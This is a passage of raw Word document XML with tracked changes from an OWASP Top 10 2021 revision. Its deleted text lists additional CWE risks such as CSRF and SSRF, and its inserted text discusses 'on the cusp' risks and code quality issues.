        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>_anchor</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>osib</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, id=id, name="Next Steps", lang=lang, source=source, parent=parent) }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724A5856" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27BD482F" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3642" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3643" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># +RF Details About Risk Factors</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2386FB62" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3644" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C669CF2" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3645" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3646" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Top 10 Risk Factor Summary</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="579FA82F" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3647" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2303FCBA" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3648" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3649" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>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severe software weaknesses may not present a serious risk if there are no threat agents in a position to perform the necessary attack or the business impact is negligible for the assets involved.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6B032364" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3650" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72719987" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3651" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3652" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>![Risk Factor Table](images/0xc1-risk-factor-table.png)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0B1BC6F5" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3653" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43AC62AC" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3654" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3655" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Additional Risks To Consider</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="475226C4" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3656" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35A61594" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3657" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3658" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>The Top 10 covers a lot of ground, but there are many other risks you should consider and evaluate in your organization. Some of these have appeared in previous versions of the Top 10, and others have not, including new attack techniques that are being identified all the time. Other important application security risks (ordered by CWE-ID) that you should additionally consider include:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3F96A994" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3659" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11F4724D" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3660" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3661" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="69D1BE26" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3662" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3663" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion',</w:delText>
        </w:r>
        <w:r w:rsidR="0024421C">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>'AppDoS')](https://cwe.mitre.org/data/definitions/400.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2E78B144" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3664" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3665" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="67354209" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3666" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3667" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-451: User Interface (UI) Misrepresentation of Critical Information (Clickjacking and others)](https://cwe.mitre.org/data/definitions/451.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0133464A" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3668" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3669" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-601: Unvalidated Forward and Redirects](https://cwe.mitre.org/data/definitions/601.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="271C3164" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3670" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3671" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-799: Improper Control of Interaction Frequency (Anti-Automation)](https://cwe.mitre.org/data/definitions/799.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7F9F9F1E" w14:textId="77777777" w:rsidR="000C5070" w:rsidRPr="000C5070" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3672" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3673" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-829: Inclusion of Functionality from Untrusted Control Sphere (3rd Party Content)](https://cwe.mitre.org/data/definitions/829.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="29A84CC8" w14:textId="77777777" w:rsidR="00EE6233" w:rsidRPr="00841D1E" w:rsidRDefault="000C5070" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3674" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3675" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="000C5070">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="292BDAEC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3676" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3677" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>By design, the OWASP Top 10 is innately limited to the ten most</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="127A56FF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3678" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3679" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>significant risks. Every OWASP Top 10 has “on the cusp” risks considered</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7A681E25" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3680" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3681" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>at length for inclusion, but in the end, they didn’t make it. No matter</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="07596369" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3682" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3683" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>how we tried to interpret or twist the data, the other risks were more</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0B477143" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3684" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3685" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>prevalent and impactful.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4ED0E112" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3686" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E573F30" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3687" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3688" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Organizations working towards a mature </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>appsec</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> program or security</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="341FF180" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3689" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3690" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">consultancies or tool vendors wishing to expand coverage for </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>their</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w14:paraId="488085E7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3691" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3692" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>offerings, the following four issues are well worth the effort to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="059DD6EC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3693" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3694" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>identify and remediate.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="134AD3B5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3695" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38A89488" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3696" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3697" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>## Code Quality issues</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3656EDB7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3698" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FEA43D2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3699" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3700" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">| CWEs </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Mapped  |</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
